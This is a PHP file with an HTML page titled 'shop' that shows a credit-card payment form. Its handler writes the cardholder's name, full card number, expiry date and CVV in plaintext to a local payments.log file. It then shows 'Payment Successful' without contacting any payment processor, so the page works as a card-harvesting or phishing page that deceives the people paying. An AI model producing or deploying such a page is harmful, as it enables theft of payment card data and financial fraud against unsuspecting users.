<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = $_POST['username'];
    $cardNumber = $_POST['cardNumber'];
    $expiryMonth = $_POST['expiryMonth'];
    $expiryYear = $_POST['expiryYear'];
    $cvv = $_POST['cvv'];
    if (!is_numeric($cardNumber) || !is_numeric($cvv) || !is_numeric($expiryMonth) || !is_numeric($expiryYear)) {
        echo 'Invalid input. Please check your details and try again.';
        exit;
    }
    $paymentDetails = "Username: $username, Card Number: $cardNumber, Expiry Date: $expiryMonth/$expiryYear, CVV: $cvv";
    file_put_contents('payments.log', $paymentDetails . PHP_EOL, FILE_APPEND);
    echo 'Payment Successful';
    header("Location: ./test");
}
?>
<!DOCTYPE html>
<html lang="en">

<head>

    <link rel="stylesheet" href="assets/css/soft-design-system.min.css">
    <title>
        shop
    </title>

</head>

<body>

    <div class="container py-5">
        <!-- For demo purpose -->
        <div class="row mb-4">
            <div class="col-lg-8 mx-auto text-center">
                <h1 class="display-6">Bootstrap Payment Forms</h1>
            </div>
        </div> <!-- End -->
        <div class="row">
            <div class="col-lg-6 mx-auto">
                <div class="card ">
                    <div class="card-header">
                        <div class="bg-white  pt-4 pl-2 pr-2 pb-2">
                            <!-- Credit card form tabs -->
                            <ul role="tablist" class="nav bg-light nav-pills rounded nav-fill mb-3">
                                <li class="nav-item bg-primary"> <a data-toggle="pill" href="" class="nav-link active "> <i class="fas fa-credit-card mr-2"></i> Credit Card </a> </li>
                                <li class="nav-item "> <a data-toggle="pill" href="#paypal" class="nav-link "> <i class="fab fa-paypal mr-2"></i> Paypal </a> </li>
                            </ul>
                        </div> <!-- End -->
                        <!-- Credit card form content -->
                        <div class="tab-content">
                            <!-- credit card info-->
                            <div id="credit-card" class="tab-pane fade show active pt-3">
                                <form method="POST" action="/payment">
                                    <div class="form-group"> <label for="username">
                                            <h6>Card Owner</h6>
                                        </label> <input type="text" name="username" placeholder="Card Owner Name" required class="form-control "> </div>
                                    <div class="form-group"> <label for="cardNumber">
                                            <h6>Card number</h6>
                                        </label>
                                        <div class="input-group"> <input type="text" name="cardNumber" placeholder="Valid card number" class="form-control " required>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-8">
                                            <div class="form-group"> <label><span class="hidden-xs">
                                                        <h6>Expiration Date</h6>
                                                    </span></label>
                                                <div class="d-flex">
                                                    <input type="number" placeholder="MM" name="expiryMonth" class="form-control" required>
                                                    <input type="number" placeholder="YY" name="expiryYear" class="form-control" required>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-sm-4">
                                            <div class="form-group mb-4"> <label data-toggle="tooltip" title="Three digit CV code on the back of your card">
                                                    <h6>CVV <i class="fa fa-question-circle d-inline"></i></h6>
                                                </label> <input type="text" name="cvv" required class="form-control"> </div>
                                        </div>
                                    </div>
                                    <div class="card-footer"> <button type="submit" class="subscribe btn btn-primary btn-block shadow-sm"> Confirm Payment </button>
                                </form>
                            </div>
                        </div> <!-- End -->



                        <!-- End -->
                    </div>
                </div>
            </div>
        </div>

</body>

</html>